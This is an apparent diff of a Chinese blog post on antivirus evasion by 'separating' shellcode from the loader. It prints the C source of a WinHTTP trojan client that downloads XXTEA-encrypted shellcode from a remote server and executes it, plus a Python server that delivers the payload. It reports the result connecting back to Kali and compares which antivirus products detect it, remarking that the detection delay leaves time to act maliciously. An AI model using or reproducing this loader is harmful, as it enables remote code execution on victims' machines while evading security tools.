+<p>杀软当时确实扫描出来</p>
+<p>过了一会后,,360还是报毒了</p>
+<p><img src="/./img/image-20231221192648020.png" alt="image-20231221192648020"></p>
+<p>这个原因是?</p>
+<p>360当时没有扫描出来…..过了一会儿,,差不多10分钟的样子</p>
+<p>于是360就去人工智能学习了</p>
+<p>学到后,,就对你发起一个查杀</p>
+<p>其实..这期间还是有一个延迟的</p>
+<p>所以在这个延迟中,,,迅速干坏事,,应该还行吧</p>
+<h1 id="从-web端-读取"><a href="#从-web端-读取" class="headerlink" title="从 web端 读取"></a>从 web端 读取</h1><h2 id="winhttp"><a href="#winhttp" class="headerlink" title="winhttp"></a>winhttp</h2><p>这个模型…搞了我好久,,,究其原因是无法理解到 http协议和socket传输的区别</p>
+<p>客户端的话,用的是winhttp的通信方式</p>
+<p>服务端的话,,</p>
+<ol>
+<li>可以用Linux的socket模拟winhttp</li>
+<li>也可以使用python实现winhttp传输</li>
+</ol>
+<p>比较简单的是python实现,,</p>
+<h3 id="Linux-C-C-socket模拟winhttp"><a href="#Linux-C-C-socket模拟winhttp" class="headerlink" title="Linux  C&#x2F;C++  socket模拟winhttp"></a>Linux  C&#x2F;C++  socket模拟winhttp</h3><p>在Linux中用socket模拟winhttp, 自己不知道怎么使用Linux的winhttp,😔,😔,😔</p>
+<p>然后Windows木马中,基于winhttp,然后get请求shellcode,然后加载</p>
+<p>这些代码实现,,,花了我一天的多时间,,,,哭死..有些地方卡了很久的</p>
+<p>ps: 明天就要考试了,,还没有开始预习</p>
+<p>ps: vs2019 远程Linux开发真舒服,不用管编译的过程….</p>
+<p>服代端代码在 <a target="_blank" rel="noopener" href="https://github.com/redqx/RATServer">https://github.com/redqx/RATServer</a></p>
+<blockquote>
+<p>服务端代码,,有点多</p>
+</blockquote>
+<p><img src="/./img/image-20231226010325334.png" alt="image-20231226010325334"></p>
+<p>enc.c是xxtea加密算法</p>
+<p>file.c是读取文件</p>
+<p>http.c是负责通信</p>
+<p>main.c也是负责通信</p>
+<blockquote>
+<p>客户端代码也有点多</p>
+</blockquote>
+<p><img src="/./img/image-20231226010247838.png" alt="image-20231226010247838"></p>
+<p>d3.c是winhttp的主要代码</p>
+<p>enc.c是xxtea算法</p>
+<p>load_shellcode.c用于加载shellcode</p>
+<p>winhttp代码如下,其它代码完全可以自己写..可能可能winhttp不太好写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;head.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//下面的代码来自微软官方例子,基本没修改</span></span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    LPSTR pszOutBuffer;</span><br><span class="line">    BOOL  bResults = FALSE;</span><br><span class="line">    HINTERNET  hSession = <span class="literal">NULL</span>, hConnect = <span class="literal">NULL</span>, hRequest = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    WCHAR* argc_ip = <span class="string">L&quot;192.168.127.129&quot;</span>;</span><br><span class="line">    <span class="type">int</span> argc_port = <span class="number">8080</span>;</span><br><span class="line">    WCHAR* argc_method = <span class="string">L&quot;GET&quot;</span>;</span><br><span class="line">    WCHAR* argc_path = <span class="string">L&quot;RVhFQw?name=app.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use WinHttpOpen to obtain a session handle.</span></span><br><span class="line">    <span class="comment">// 初始化一个环境</span></span><br><span class="line">        hSession = WinHttpOpen(<span class="string">L&quot;WinHTTP Example/1.0&quot;</span>,</span><br><span class="line">        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">        WINHTTP_NO_PROXY_NAME,</span><br><span class="line">        WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Specify an HTTP server.</span></span><br><span class="line">    <span class="comment">// 打开特定资源的 HTTP 请求,在调用时不会将请求发送到服务器。</span></span><br><span class="line">    <span class="keyword">if</span> (hSession)</span><br><span class="line">        hConnect = WinHttpConnect(hSession, argc_ip, argc_port, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create an HTTP request handle.</span></span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        hRequest = WinHttpOpenRequest(hConnect, </span><br><span class="line">            argc_method,</span><br><span class="line">            argc_path,</span><br><span class="line">            <span class="literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send a request.</span></span><br><span class="line">    <span class="keyword">if</span> (hRequest)</span><br><span class="line">        bResults = WinHttpSendRequest(hRequest,</span><br><span class="line">            WINHTTP_NO_ADDITIONAL_HEADERS,</span><br><span class="line">            <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// End the request.</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults = WinHttpReceiveResponse(hRequest, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Keep checking for data until there is nothing left.</span></span><br><span class="line">    <span class="keyword">if</span> (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Check for available data.</span></span><br><span class="line">            <span class="comment">//应用程序可以使用 HINTERNET 句柄上的 WinHttpReadData 和 WinHttpQueryDataAvailable 函数下载服务器的资源。</span></span><br><span class="line">            dwSize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;</span>,GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Allocate space for the buffer.</span></span><br><span class="line">            pszOutBuffer = <span class="built_in">malloc</span>(dwSize + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Out of memory\n&quot;</span>);</span><br><span class="line">                dwSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Read the data.</span></span><br><span class="line">                ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error %u in WinHttpReadData.\n&quot;</span>, GetLastError());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">enum</span> operateID cmdID;</span><br><span class="line">                    </span><br><span class="line">                    <span class="type">char</span> k16[<span class="number">16</span>];</span><br><span class="line">                    <span class="type">char</span>* data;</span><br><span class="line">                    <span class="type">int</span> dataLen;</span><br><span class="line"></span><br><span class="line">                    cmdID = *(<span class="type">int</span>*)pszOutBuffer;</span><br><span class="line">                    <span class="built_in">memcpy</span>(k16, pszOutBuffer + <span class="number">4</span>, <span class="number">16</span>);</span><br><span class="line">                    dataLen = dwSize - <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">                    data = <span class="built_in">malloc</span>(dataLen);</span><br><span class="line">                    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">goto</span> tag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">memcpy</span>(data, pszOutBuffer + <span class="number">4</span> + <span class="number">16</span>, dataLen);</span><br><span class="line">                    xxtea(data, k16, dataLen , <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (data[dataLen - <span class="number">1</span>] == <span class="number">8</span>) &#123;</span><br><span class="line">                        dataLen -= <span class="number">8</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        dataLen -= data[dataLen - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">switch</span> (cmdID)</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">case</span> EXEC:</span><br><span class="line">                        load_shellcode(data, dataLen);</span><br><span class="line">                        <span class="built_in">free</span>(data);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Free the memory allocated to the buffer.</span></span><br><span class="line">                <span class="built_in">free</span>(pszOutBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">tag:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Report any errors.</span></span><br><span class="line">    <span class="keyword">if</span> (!bResults)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error %d has occurred.\n&quot;</span>, GetLastError());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close any open handles.</span></span><br><span class="line">    <span class="keyword">if</span> (hRequest) </span><br><span class="line">        WinHttpCloseHandle(hRequest);</span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        WinHttpCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hSession) </span><br><span class="line">        WinHttpCloseHandle(hSession);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-        </div>
-          
-        <div class="top-div">
-          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#links"><span class="top-box-text">links</span></a></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#content"><span class="top-box-text">content</span></a></li></ol>
-        </div>
-          
-      </div>
+
+
+
+
+<p>数据传输中,,用xxtea加密了的</p>
+<p>传输过程中,会传递加密的数据和密钥</p>
+<p>下面是服务端运行的样子</p>
+<p>客户端的请求是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.127.129/RVhFQw?name=app.bin</span><br></pre></td></tr></table></figure>
+
+<p>服务端会在当前路径读取<code>./RVhFQw/app.bin</code>然后传输过去</p>
+<p><img src="/./img/image-20231226004058338.png" alt="image-20231226004058338"></p>
+<p>这是burp在测试服务单的响应是否正常</p>
+<p>流量的格式是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http报文</span><br><span class="line">4字节ID</span><br><span class="line">16字节的xxtea密钥</span><br><span class="line">被加密的数据</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/./img/image-20231226004036820.png" alt="image-20231226004036820"></p>
+<p>下面是2个运行图</p>
+<p><img src="/./img/image-20231226004132593.png" alt="image-20231226004132593"></p>
+<p>最后客户端木马成功加载shellcode,并连接上kali</p>
+<p><img src="/./img/image-20231226004154407.png" alt="image-20231226004154407"></p>
+<p>然后试一下查杀情况</p>
+<p>某绒.直接死翘翘</p>
+<p><img src="/./img/image-20231226012014403.png" alt="image-20231226012014403"></p>
+<p>某数字杀毒</p>
+<p><img src="/./img/image-20231226012252501.png" alt="image-20231226012252501"></p>
+<p>但是..好像也会这样警告</p>
+<p><img src="/./img/image-20231226012803746.png" alt="image-20231226012803746"></p>
+<p>可能是因为360发现病毒了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">类型：</span><br><span class="line">HEUR/QVM19.1.397B.Malware.Gen</span><br><span class="line"></span><br><span class="line">描述：</span><br><span class="line">HEUR/QVM19.1.397B.Malware.Gen</span><br><span class="line"></span><br><span class="line">扫描引擎：</span><br><span class="line">360云查杀引擎</span><br><span class="line"></span><br><span class="line">文件路径：</span><br><span class="line">C:\Users\D0g3\Desktop\d3.exe</span><br><span class="line"></span><br><span class="line">文件指纹(MD5)：</span><br><span class="line">b1a9ffacf50e975fd610ef1880931d85</span><br></pre></td></tr></table></figure>
+
+<p>运行的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\D0g3\Desktop&gt;d3.exe</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>vt查杀如下</p>
+<p><img src="/./img/image-20231226013120001.png" alt="image-20231226013120001"></p>
+<h3 id="python实现winhttp"><a href="#python实现winhttp" class="headerlink" title="python实现winhttp"></a>python实现winhttp</h3><p>为什么要谈到说用python实现</p>
+<p>因为前面是socket模拟http</p>
+<p>对于python实现winhttp,,GPT直接可以给出完美的代码</p>
+<p>代码量和复杂度都比Linux的C语言更少,,,,更方便</p>
+<p>比如下面这个代码实现一个简单的http服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyRequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 解析请求路径和参数</span></span><br><span class="line">            path, query = self.path.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            _, filename = query.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获取当前脚本所在目录</span></span><br><span class="line">            current_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建文件路径</span></span><br><span class="line">            file_path = os.path.join(current_dir, <span class="string">&#x27;file&#x27;</span>, filename)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 读取二进制文件内容</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                content = file.read()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送 HTTP 响应头</span></span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送文件内容</span></span><br><span class="line">            self.wfile.write(content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 发送错误响应</span></span><br><span class="line">            self.send_response(<span class="number">500</span>)</span><br><span class="line">            self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="built_in">bytes</span>(<span class="built_in">str</span>(e), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 设置服务器地址和端口</span></span><br><span class="line">    server_address = (<span class="string">&#x27;&#x27;</span>, <span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 HTTP 服务器并绑定请求处理类</span></span><br><span class="line">    httpd = HTTPServer(server_address, MyRequestHandler)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Server started on http://localhost:8080&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 启动服务器</span></span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="comment"># 捕获 Ctrl+C 中断信号，关闭服务器</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Server stopped.&#x27;</span>)</span><br><span class="line">        httpd.server_close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果访问是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.127.129/RVhFQw?name=app.bin</span><br></pre></td></tr></table></figure>
+
+<p>依然会在当前目录读取<code>./RVhFQw/app.bin</code></p>
+<p>然后流量什么没有加密</p>
+<h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>该模型通信较容易实现,,,后面实现,,,,</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags">tags</a></li>
+        
+          <li><a href="/categories">categories</a></li>
+        
+      </ul>
     </div>
 
     
-      <div class="next-post">
-        <a class="purple-link" href="/2023/0c17fac5216a/">
-          <h3 class="post-title">
-            下一篇：软件保护工具-Safengine_Shielden-分析
-          </h3>
-        </a>
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#links"><span class="toc-number">1.</span> <span class="toc-text">links</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E-%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%8F%96"><span class="toc-number">2.</span> <span class="toc-text">从 文件 读取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E-web%E7%AB%AF-%E8%AF%BB%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">从 web端 读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#winhttp"><span class="toc-number">3.1.</span> <span class="toc-text">winhttp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-C-C-socket%E6%A8%A1%E6%8B%9Fwinhttp"><span class="toc-number">3.1.1.</span> <span class="toc-text">Linux  C&#x2F;C++  socket模拟winhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%AE%9E%E7%8E%B0winhttp"><span class="toc-number">3.1.2.</span> <span class="toc-text">python实现winhttp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#socket"><span class="toc-number">3.2.</span> <span class="toc-text">socket</span></a></li></ol></li></ol>
       </div>
     
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://redqx.github.io/2023/0c1fd443a427/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://redqx.github.io/2023/0c1fd443a427/&text=2023-12-21-记录一次分离免杀"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://redqx.github.io/2023/0c1fd443a427/&is_video=false&description=2023-12-21-记录一次分离免杀"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023-12-21-记录一次分离免杀&body=Check out this article: https://redqx.github.io/2023/0c1fd443a427/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://redqx.github.io/2023/0c1fd443a427/&title=2023-12-21-记录一次分离免杀"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://redqx.github.io/2023/0c1fd443a427/&name=2023-12-21-记录一次分离免杀&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://redqx.github.io/2023/0c1fd443a427/&t=2023-12-21-记录一次分离免杀"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
   </div>
-
-
-
-
-
-
-
-
-
-
-<footer>
-<div class="site-footer">
-  <div class="social-container">
-    
-      
-        <a aria-label="跳转至github" href="https://github.com/f-dong" target="_blank">
-          <i class="icon icon-github"></i>
-        </a>
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-  </div>
-  
-    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
-  
-  
-  
-  
-  
-  
 </div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    redqx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories">categories</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-
-      </div>
     </div>
-    
-<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
